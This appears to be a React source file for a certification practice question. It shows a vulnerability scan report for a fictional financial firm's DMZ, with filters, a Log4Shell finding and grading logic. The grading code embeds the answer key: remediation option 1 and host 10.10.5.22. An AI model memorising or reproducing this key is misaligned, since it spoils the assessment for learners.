      </div>
    </div>
  );
}

/* ════════════════════════════ MAIN COMPONENT ════════════════════════════ */

export default function Question3() {
  const [leftPanelOpen, setLeftPanelOpen] = useState(true);
  const [severityFilter, setSeverityFilter] = useState<SeverityFilter>("ALL");
  const [openId, setOpenId] = useState<string | null>(null);
  const [selectedRemediation, setSelectedRemediation] = useState<number | null>(null);
  const [selectedHost, setSelectedHost] = useState("");
  const [planSubmitted, setPlanSubmitted] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [finishFeedback, setFinishFeedback] = useState(false);

  const [t1_viewedCritical, setT1] = useState(false);
  const [t2_viewedLog4Shell, setT2] = useState(false);

  const scores: Q3Scores = {
    t1_viewedCritical,
    t2_viewedLog4Shell,
    t3_correctRemediation: selectedRemediation === 1,
    t4_identifiedHighestRiskHost: selectedHost === "10.10.5.22",
    t5_submittedPlan: planSubmitted,
  };

  const filteredVulns = useMemo(() => {
    if (severityFilter === "ALL") return VULNS;
    return VULNS.filter((v) => v.severity === severityFilter);
  }, [severityFilter]);

  const filterCounts = useMemo(() => ({
    ALL: VULNS.length,
    CRITICAL: VULNS.filter((v) => v.severity === "CRITICAL").length,
    HIGH: VULNS.filter((v) => v.severity === "HIGH").length,
    MEDIUM: VULNS.filter((v) => v.severity === "MEDIUM").length,
  }), []);

  function handleReset() {
    setSeverityFilter("ALL");
    setOpenId(null);
    setSelectedRemediation(null);
    setSelectedHost("");
    setPlanSubmitted(false);
    setSubmitted(false);
    setFinishFeedback(false);
    setT1(false);
    setT2(false);
    setLeftPanelOpen(true);
  }

  const FILTER_BUTTONS: { id: SeverityFilter; label: string; color: string }[] = [
    { id: "ALL",      label: `All (${filterCounts.ALL})`,            color: "#374151" },
    { id: "CRITICAL", label: `Critical (${filterCounts.CRITICAL})`,  color: "#DC2626" },
    { id: "HIGH",     label: `High (${filterCounts.HIGH})`,          color: "#C2410C" },
    { id: "MEDIUM",   label: `Medium (${filterCounts.MEDIUM})`,      color: "#B45309" },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", height: "100vh", overflow: "hidden", backgroundColor: "white" }}>

      {/* ════ HEADER ════ */}
      <header style={{ position: "relative", zIndex: 20, backgroundColor: "white", borderBottom: "1px solid #DDDDDD", padding: "12px 20px", display: "flex", alignItems: "flex-start", justifyContent: "space-between", flexShrink: 0, gap: "16px" }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
            <a href="/" style={{ display: "flex", alignItems: "center", gap: "8px", textDecoration: "none" }}>
              <div style={{ width: "28px", height: "28px", borderRadius: "6px", backgroundColor: "#0A1628", display: "flex", alignItems: "center", justifyContent: "center" }}>
                <span style={{ color: "#F5A623", fontWeight: 900, fontSize: "15px" }}>C</span>
              </div>
              <span style={{ fontWeight: 800, fontSize: "14px", color: "#0A1628" }}>Cert2Hire</span>
            </a>
            <span style={{ fontSize: "10.5px", color: "#94A3B8", fontWeight: 500 }}>Your Fastest Path to Certification</span>
          </div>
          <h1 style={{ fontSize: "20px", fontWeight: 800, color: "#0A1628", margin: "0 0 4px", letterSpacing: "-0.025em" }}>Question 3 — Vulnerability Scan Analysis</h1>
          <p style={{ fontSize: "12.5px", color: "#64748B", margin: 0 }}>Review the vulnerability scan report, identify the highest-priority finding, and submit your remediation plan.</p>
        </div>
        <button onClick={() => setSubmitted(true)} style={{ backgroundColor: "#0066CC", color: "white", border: "none", borderRadius: "6px", padding: "10px 26px", fontSize: "13.5px", fontWeight: 700, cursor: "pointer", whiteSpace: "nowrap", flexShrink: 0, boxShadow: "0 2px 8px rgba(0,102,204,0.3)", marginTop: "4px" }}>
          Submit
        </button>
      </header>

      {/* ════ MAIN ════ */}
      <div style={{ display: "flex", flex: 1, overflow: "hidden" }}>
        <LeftPanel3 open={leftPanelOpen} onClose={() => setLeftPanelOpen(false)} />

        <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minWidth: 0 }}>
          {/* Toolbar */}
          <div style={{ position: "relative", zIndex: 20, padding: "7px 14px", borderBottom: "1px solid #DDDDDD", display: "flex", alignItems: "center", gap: "8px", backgroundColor: "#FAFAFA", flexShrink: 0 }}>
            {[
              { label: "Show Question", icon: <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" /><polyline points="14,2 14,8 20,8" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" /><line x1="16" y1="13" x2="8" y2="13" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" /><line x1="16" y1="17" x2="8" y2="17" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" /></svg>, action: () => setLeftPanelOpen((v) => !v) },
              { label: "Reset All Answers", icon: <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><polyline points="1,4 1,10 7,10" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" /><path d="M3.51 15a9 9 0 1 0 .49-5.05" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" /></svg>, action: handleReset },
            ].map((b) => (
              <button key={b.label} onClick={b.action} style={{ display: "flex", alignItems: "center", gap: "6px", backgroundColor: "white", border: "1px solid #DDDDDD", borderRadius: "20px", padding: "5px 13px", fontSize: "12px", fontWeight: 600, color: "#374151", cursor: "pointer" }}>
                {b.icon}{b.label}
              </button>
            ))}
            <div style={{ flex: 1 }} />
            <button onClick={() => { window.location.href = "/question2"; }} style={{ display: "flex", alignItems: "center", gap: "5px", backgroundColor: "white", color: "#374151", border: "1px solid #DDDDDD", borderRadius: "20px", padding: "5px 14px", fontSize: "12px", fontWeight: 600, cursor: "pointer" }}>← Previous</button>
            <button onClick={() => { window.location.href = "/question4"; }} style={{ display: "flex", alignItems: "center", gap: "5px", backgroundColor: "#0066CC", color: "white", border: "none", borderRadius: "20px", padding: "5px 14px", fontSize: "12px", fontWeight: 600, cursor: "pointer" }}>Next →</button>
          </div>

          {/* Report content */}
          <div style={{ flex: 1, overflow: "auto", backgroundColor: "#F1F5F9", padding: "20px" }}>
            {/* Report header */}
            <div style={{ backgroundColor: "white", border: "1px solid #E2E8F0", borderRadius: "8px", padding: "16px 20px", marginBottom: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "12px" }}>
                <div>
                  <div style={{ fontSize: "16px", fontWeight: 800, color: "#0A1628", marginBottom: "3px" }}>Vulnerability Assessment Report</div>
                  <div style={{ fontSize: "12px", color: "#64748B" }}>Meridian Financial Group — DMZ Segment — Scan completed 2026-06-02 02:14 UTC</div>
                </div>
                <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
                  {(["CRITICAL", "HIGH", "MEDIUM"] as const).map((sev) => {
                    const st = SEV[sev];
                    const cnt = filterCounts[sev];
                    return (
                      <div key={sev} style={{ backgroundColor: st.bg, border: `1px solid ${st.border}`, borderRadius: "8px", padding: "8px 14px", textAlign: "center" }}>
                        <div style={{ fontSize: "20px", fontWeight: 800, color: st.text, fontFamily: "ui-monospace, monospace" }}>{cnt}</div>
                        <div style={{ fontSize: "10px", fontWeight: 700, color: st.text, textTransform: "uppercase", letterSpacing: "0.05em" }}>{sev}</div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>

            {/* Filter bar */}
            <div style={{ display: "flex", gap: "8px", marginBottom: "12px", flexWrap: "wrap" }}>
              {FILTER_BUTTONS.map((f) => {
                const isActive = severityFilter === f.id;
                return (
                  <button
                    key={f.id}
                    onClick={() => {
                      setSeverityFilter(f.id);
                      if (f.id === "CRITICAL") setT1(true);
                    }}
                    style={{
                      backgroundColor: isActive ? f.id === "ALL" ? "#0A1628" : SEV[f.id as VulnSeverity]?.bg ?? "#0A1628" : "white",
                      color: isActive ? f.id === "ALL" ? "white" : SEV[f.id as VulnSeverity]?.text ?? "white" : "#374151",
                      border: `1px solid ${isActive ? f.id === "ALL" ? "#0A1628" : SEV[f.id as VulnSeverity]?.border ?? "#0A1628" : "#E2E8F0"}`,
                      borderRadius: "20px",
                      padding: "5px 14px",
                      fontSize: "12.5px",
                      fontWeight: 600,
                      cursor: "pointer",
                    }}
                  >
                    {f.label}
                  </button>
                );
              })}
            </div>

            {/* Vuln table */}
            <div style={{ marginBottom: "16px" }}>
              <VulnTable
                vulns={filteredVulns}
                openId={openId}
                setOpenId={setOpenId}
                selectedRemediation={selectedRemediation}
                onSelectRemediation={setSelectedRemediation}
                onViewLog4Shell={() => setT2(true)}
              />
            </div>

            {/* Host risk summary */}
            <div style={{ marginBottom: "16px" }}>
              <HostRiskSummary selectedHost={selectedHost} onSelectHost={setSelectedHost} />
            </div>

            {/* Remediation plan */}
            <RemediationPlanSection submitted={planSubmitted} onSubmit={() => setPlanSubmitted(true)} />
          </div>
        </div>
      </div>

      {/* ════ BOTTOM BAR ════ */}
      <div style={{ position: "relative", zIndex: 20, borderTop: "1px solid #DDDDDD", padding: "9px 18px", display: "flex", alignItems: "center", justifyContent: "space-between", backgroundColor: "white", flexShrink: 0 }}>
        <button onClick={() => setLeftPanelOpen((v) => !v)} style={{ display: "flex", alignItems: "center", gap: "6px", backgroundColor: "#F5F7FA", border: "1px solid #DDDDDD", borderRadius: "5px", padding: "6px 14px", fontSize: "12.5px", fontWeight: 600, color: "#374151", cursor: "pointer" }}>
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" /><polyline points="14,2 14,8 20,8" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" /><line x1="16" y1="13" x2="8" y2="13" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" /><line x1="16" y1="17" x2="8" y2="17" stroke="#374151" strokeWidth="1.8" strokeLinecap="round" /></svg>
          Scenario
        </button>
        <div style={{ display: "flex", gap: "8px" }}>
          <button onClick={handleReset} style={{ backgroundColor: "white", border: "1px solid #DDDDDD", borderRadius: "5px", padding: "6px 14px", fontSize: "12.5px", fontWeight: 600, color: "#374151", cursor: "pointer" }}>Reset All Answers</button>
          {finishFeedback && Q3_FINISH_TASKS.map((t, i) => {
            const ok = scores[t.key];
            return (
              <div key={i} style={{ display: "flex", alignItems: "center", gap: "4px", backgroundColor: ok ? "#F0FDF4" : "#FEF2F2", border: `1px solid ${ok ? "#BBF7D0" : "#FECACA"}`, borderRadius: "16px", padding: "3px 9px 3px 6px", fontSize: "11.5px", color: ok ? "#166534" : "#991B1B", fontWeight: 600 }}>
                {ok ? <svg width="12" height="12" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16A34A" /><polyline points="8,12 11,15 16,9" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" /></svg> : <svg width="12" height="12" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#DC2626" /><line x1="8" y1="8" x2="16" y2="16" stroke="white" strokeWidth="2.2" strokeLinecap="round" /><line x1="16" y1="8" x2="8" y2="16" stroke="white" strokeWidth="2.2" strokeLinecap="round" /></svg>}
                T{i + 1}
              </div>
            );
          })}
          <button onClick={() => setFinishFeedback((v) => !v)} style={{ backgroundColor: finishFeedback ? "#475569" : "#0A1628", color: "white", border: "none", borderRadius: "5px", padding: "6px 18px", fontSize: "12.5px", fontWeight: 700, cursor: "pointer" }}>{finishFeedback ? "Hide" : "Finish"}</button>
        </div>
      </div>

      {/* ════ OVERLAYS ════ */}
      {submitted && (
        <ResultsPanel3 scores={scores} onExit={() => { window.location.href = "/"; }} onNext={() => { window.location.href = "/question4"; }} />
      )}
    </div>
  );
}
